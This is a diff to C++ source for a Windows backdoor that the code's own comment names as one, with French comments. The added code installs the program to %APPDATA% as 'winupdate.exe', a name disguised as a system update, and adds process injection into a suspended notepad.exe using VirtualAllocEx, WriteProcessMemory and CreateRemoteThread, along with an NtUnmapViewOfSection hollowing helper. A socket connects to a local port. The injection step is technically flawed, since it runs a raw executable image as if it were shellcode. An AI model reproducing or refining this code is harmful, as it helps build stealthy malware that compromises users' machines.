@@ -1,21 +1,41 @@
 #include <iostream>
 #include <winsock2.h>
 #include <windows.h>
+#include <tlhelp32.h>
+#include <psapi.h>
 #include <stdexcept>
 #include <array>
 #include <filesystem>
 #include <codecvt>
 #include <vector>
+#include <stdio.h>
+#include <fstream>
 
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "ntdll.lib")
 
 using namespace std;
 namespace fs = std::filesystem;
 
 const char* HOST = "127.0.0.1";
 const int PORT = 65000;
+const string NOTEPAD_PATH = R"(C:\Windows\System32\notepad.exe)";
 
-string install_path;
+string install_path = string(getenv("APPDATA")) + "\\WinUpdate";
+typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
+
+BOOL UnmapTargetSection(HANDLE hProcess, PVOID baseAddress) {
+    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
+    if (!hNtdll) return FALSE;
+
+    auto NtUnmapViewOfSection =
+            (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
+
+    if (!NtUnmapViewOfSection) return FALSE;
+
+    NTSTATUS status = NtUnmapViewOfSection(hProcess, baseAddress);
+    return status == 0; // STATUS_SUCCESS == 0
+}
 
 /**
  * Function install : create the directory for the backdoor file and installs it there
@@ -24,19 +44,32 @@ string install_path;
  *
  */
 void install(const char * filename) {
-    char *AppDataPath = getenv("APPDATA");
-    install_path = string(AppDataPath) + "\\WinUpdate";
     fs::create_directory(install_path);
 
-    fs::path executablePath = fs::absolute(fs::path(filename));
+    fs::path executablePath = absolute(fs::path(filename));
     string installTarget = install_path + "\\winupdate.exe";
 
     try {
-        fs::copy_file(executablePath, installTarget);
+        copy_file(executablePath, installTarget);
     }
     catch (std::exception &e) {
         cout << e.what();
     }
+}
+
+LPVOID get_base_address(DWORD pid) {
+    HANDLE process_h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!process_h) return nullptr;
+
+    HMODULE h_mod;
+    DWORD cb_needed;
+    if (EnumProcessModules(process_h, &h_mod, sizeof(h_mod), &cb_needed )) {
+        CloseHandle(process_h);
+        return h_mod;
+    }
+
+    CloseHandle(process_h);
+    return nullptr;
 }
 
 
@@ -45,7 +78,25 @@ void install(const char * filename) {
  *
  */
 void launch_process() {
-    // Initialization of the setting for the new procss
+    // Ouvrir le fichier exécutable (winupdate.exe)
+    std::ifstream exe_file(install_path + "\\winupdate.exe", std::ios::binary | std::ios::ate);
+    if (!exe_file.is_open()) {
+        std::cerr << "Erreur lors de l'ouverture de l'exécutable." << std::endl;
+        return;
+    }
+
+    std::streamsize size = exe_file.tellg();
+    exe_file.seekg(0, std::ios::beg);
+
+    // Allouer un buffer pour stocker l'exécutable
+    char* buffer = new char[size];
+    if (!exe_file.read(buffer, size)) {
+        std::cerr << "Erreur lors de la lecture du fichier." << std::endl;
+        delete[] buffer;
+        return;
+    }
+
+    // Initialisation des paramètres pour le nouveau processus
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
 
@@ -53,8 +104,79 @@ void launch_process() {
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));
 
+    // Création du processus légitime (notepad.exe)
+    std::vector<char> notepad_vec(NOTEPAD_PATH.begin(), NOTEPAD_PATH.end());
+    notepad_vec.push_back('\0');  // S'assurer que la chaîne est bien terminée par un null
+
+    if (!CreateProcess(nullptr,
+                       notepad_vec.data(),
+                       nullptr,
+                       nullptr,
+                       FALSE,
+                       CREATE_SUSPENDED,
+                       nullptr,
+                       install_path.c_str(),
+                       &si,
+                       &pi)) {
+        std::cerr << "Erreur lors de la création du processus. Code d'erreur : " << GetLastError() << std::endl;
+        delete[] buffer;
+        return;
+    }
+
+    // Si la création du processus réussie, nous obtenons son PID
+    std::cout << "Processus créé avec PID : " << pi.dwProcessId << std::endl;
+
+    // Allouer de la mémoire dans le processus cible pour l'exécutable
+    LPVOID remote_mem = VirtualAllocEx(pi.hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remote_mem) {
+        std::cerr << "VirtualAllocEx a échoué. Code d'erreur : " << GetLastError() << std::endl;
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        delete[] buffer;
+        return;
+    }
+
+    // Écrire l'exécutable dans la mémoire allouée du processus cible
+    if (!WriteProcessMemory(pi.hProcess, remote_mem, buffer, size, nullptr)) {
+        std::cerr << "WriteProcessMemory a échoué. Code d'erreur : " << GetLastError() << std::endl;
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        delete[] buffer;
+        return;
+    }
+
+    // Créer un thread distant pour exécuter le code injecté
+    HANDLE hThread = CreateRemoteThread(pi.hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remote_mem, nullptr, 0, nullptr);
+    if (hThread == NULL) {
+        DWORD error_code = GetLastError();
+        std::cerr << "Échec de la création du thread distant. Code d'erreur : " << error_code << std::endl;
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        delete[] buffer;
+        return;
+    }
+
+    // Reprendre l'exécution du processus légitime
+    if (ResumeThread(pi.hThread) == -1) {
+        std::cerr << "Erreur lors de la reprise du thread. Code d'erreur : " << GetLastError() << std::endl;
+        CloseHandle(hThread);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        delete[] buffer;
+        return;
+    }
+
+    // Attendre que le thread distant termine
+    WaitForSingleObject(hThread, INFINITE);
+
+    // Fermer les handles ouverts
+    CloseHandle(hThread);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    delete[] buffer;
+
     // Conversion to a vector (mutable)
-    vector<char> cmdVec(install_path.begin(), install_path.end());
+    /*vector<char> cmdVec(install_path.begin(), install_path.end());
     cmdVec.push_back('\0');
 
     // Creation of the new process
@@ -69,7 +191,7 @@ void launch_process() {
             install_path.c_str(), // Startup directory
             &si,
             &pi
-    );
+    );*/
 }
 
 
@@ -238,16 +360,26 @@ int main() {
     char *AppDataPath = std::getenv("APPDATA");
     string InstallPath = string(AppDataPath) + "\\WinUpdate";
 
-    if (!fs::exists(InstallPath) && !fs::is_directory(InstallPath)) {
+    if (strcmp(__argv[0], NOTEPAD_PATH.c_str()) != 0) {
+        install(__argv[0]);
+        launch_process();
+        cout << "On lance le prog" << endl;
+        cin.get();
+        return 1;
+    }
+    else {
+        cout << "Notepad installation" << endl;
+    }
+    /*if (!fs::exists(InstallPath) && !fs::is_directory(InstallPath)) {
         install(__argv[0]);
         add_to_startup();
 
         return 0;
     }
-    else if (fs::current_path().string()!=InstallPath && fs::current_path().string()!=system32Path) {
+    if (fs::current_path().string()!=InstallPath && fs::current_path().string()!=system32Path) {
         launch_process();
         return 0;
-    }
+    }*/
 
     // Initialization of Winsock
     while (true) {
